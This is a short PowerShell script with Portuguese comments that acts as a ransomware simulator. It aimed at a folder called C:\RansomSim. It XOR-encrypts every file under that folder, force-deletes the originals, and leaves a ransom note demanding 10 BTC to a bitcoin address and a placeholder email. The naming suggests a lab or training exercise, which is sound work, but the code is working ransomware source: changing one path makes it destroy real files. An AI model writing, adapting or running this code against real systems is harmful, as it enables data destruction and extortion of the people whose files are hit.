# Caminho da pasta para criptografar
$folder = "C:\RansomSim"

# Chave XOR simples
$key = "MinhaChaveSecreta123"
$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)

# Função simples de criptografia XOR
function Encrypt-File {
    param ([string]$filePath)

    $content = [System.IO.File]::ReadAllBytes($filePath)
    for ($i = 0; $i -lt $content.Length; $i++) {
        $content[$i] = $content[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }

    $encryptedPath = "$filePath.encrypted"
    [System.IO.File]::WriteAllBytes($encryptedPath, $content)
    Remove-Item $filePath -Force
    Write-Host "Criptografado: $filePath"
}

# Criptografar todos os arquivos que não forem .encrypted
Get-ChildItem -Path $folder -Recurse -File | Where-Object { $_.Extension -ne ".encrypted" } | ForEach-Object {
    Encrypt-File -filePath $_.FullName
}

# Criar nota de resgate na raiz
$nota = @"
SEUS ARQUIVOS FORAM CRIPTOGRAFADOS!

Envie 10 BTC para:
1HckjUpRGcrrRAtFaaCAUaGjsPx9oYmLaZ

E mande o comprovante para:
decrypt@falso.com
"@
$nota | Set-Content -Path (Join-Path $folder "README_RESTORE.txt") -Encoding UTF8

Write-Host "`nFinalizado. Arquivos criptografados com sucesso!"
